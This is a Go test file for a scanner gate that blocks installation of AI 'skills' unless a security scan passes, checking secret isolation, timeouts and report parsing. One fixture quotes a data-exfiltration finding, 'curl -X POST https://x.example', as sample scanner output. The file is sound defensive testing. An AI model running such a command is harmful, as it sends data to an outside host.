package skillscan

import (
	"context"
	"errors"
	"fmt"
	"os"
	"strconv"
	"strings"
	"testing"
	"time"
)

// TestMain 让测试二进制自己充当假扫描器：
// 命令行以 "scan" 开头时，按最后一个参数里约定的方式退出。
func TestMain(m *testing.M) {
	if len(os.Args) >= 3 && os.Args[1] == "scan" {
		fakeScanner(os.Args[2:])
	}
	os.Exit(m.Run())
}

func fakeScanner(args []string) {
	fmt.Printf("扫描 %s\n", args[0])
	// 主进程的密钥不该被扫描器继承。
	if os.Getenv("ATOM_DSN") != "" || os.Getenv("DEEPSEEK_API_KEY") != "" {
		fmt.Println("泄露: 扫描器拿到了主进程的密钥")
		os.Exit(3)
	}
	for _, a := range args[1:] {
		if a == "--hang" {
			time.Sleep(time.Minute)
		}
		if code, ok := strings.CutPrefix(a, "--exit="); ok {
			n, _ := strconv.Atoi(code)
			os.Exit(n)
		}
	}
	os.Exit(0)
}

func fake(extra ...string) Scanner {
	return Scanner{Command: os.Args[0], ExtraArgs: extra, Timeout: 20 * time.Second}
}

func TestCheck_只有扫描通过才允许安装(t *testing.T) {
	t.Setenv("ATOM_DSN", "postgres://secret")
	t.Setenv("DEEPSEEK_API_KEY", "sk-secret")
	ctx := context.Background()

	rep, err := fake().Check(ctx, "./my-skill")
	if err != nil {
		t.Fatalf("扫描通过应允许安装: %v\n%s", err, rep.Output)
	}
	if !strings.Contains(rep.Output, "./my-skill") {
		t.Fatalf("应保留扫描器输出用于展示: %q", rep.Output)
	}

	rep, err = fake("--exit=1").Check(ctx, "./my-skill")
	if !errors.Is(err, ErrUnsafe) || rep.ExitCode != 1 {
		t.Fatalf("退出码 1 应判定不安全: %v", err)
	}

	// 扫描器自己出错：不是"不安全"，但同样不能装。
	_, err = fake("--exit=2").Check(ctx, "./my-skill")
	if !errors.Is(err, ErrScanFailed) || errors.Is(err, ErrUnsafe) {
		t.Fatalf("扫描器出错应返回 ErrScanFailed: %v", err)
	}
}

func TestCheck_扫描没跑成一律拒绝(t *testing.T) {
	ctx := context.Background()

	// 扫描器没装。绝不能退化成"跳过扫描继续装"。
	_, err := Scanner{Command: "一个不存在的扫描器"}.Check(ctx, "./my-skill")
	if !errors.Is(err, ErrScanFailed) {
		t.Fatalf("扫描器不存在应拒绝安装: %v", err)
	}

	hang := fake("--hang")
	hang.Timeout = 300 * time.Millisecond
	if _, err := hang.Check(ctx, "./my-skill"); !errors.Is(err, ErrScanFailed) {
		t.Fatalf("扫描超时应拒绝安装: %v", err)
	}

	if _, err := fake().Check(ctx, "  "); !errors.Is(err, ErrScanFailed) {
		t.Fatalf("没有路径应拒绝: %v", err)
	}
}

func TestFindings_解析两种报告并认出外传与高危(t *testing.T) {
	rep := Report{Output: `warning: no provider
{"issues":[
  {"id":"E1","category":"Data Exfiltration","severity":"medium","finding":" curl -X POST https://x.example ","location":{"file":"SKILL.md","start_line":9}},
  {"id":"P1","category":"Prompt Injection","severity":"HIGH","finding":"ignore","location":{"file":"a.md","start_line":null}}],
 "findings":[{"id":"MCP-REPOSITORY","message":"没有仓库","severity":"info"}]}`}
	got, err := rep.Findings()
	if err != nil || len(got) != 3 {
		t.Fatalf("解析失败: %+v, %v", got, err)
	}
	if !got[0].Outbound() || got[0].Severe() || got[0].Severity != "MEDIUM" || got[0].Where != "SKILL.md 第 9 行" ||
		got[0].Text != "curl -X POST https://x.example" {
		t.Fatalf("外传的发现不对: %+v", got[0])
	}
	if got[1].Outbound() || !got[1].Severe() || got[1].Where != "a.md" {
		t.Fatalf("高危的发现不对: %+v", got[1])
	}
	if got[2].Severity != "INFO" || got[2].Text != "没有仓库" || got[2].Category != "" {
		t.Fatalf("登记处条目的发现不对: %+v", got[2])
	}
	// 看不懂的报告不能当作没有发现。
	for _, out := range []string{"", "扫描完成", "{不是 JSON"} {
		if _, err := (Report{Output: out}).Findings(); !errors.Is(err, ErrScanFailed) {
			t.Errorf("报告 %q 应按没扫成处理: %v", out, err)
		}
	}
}
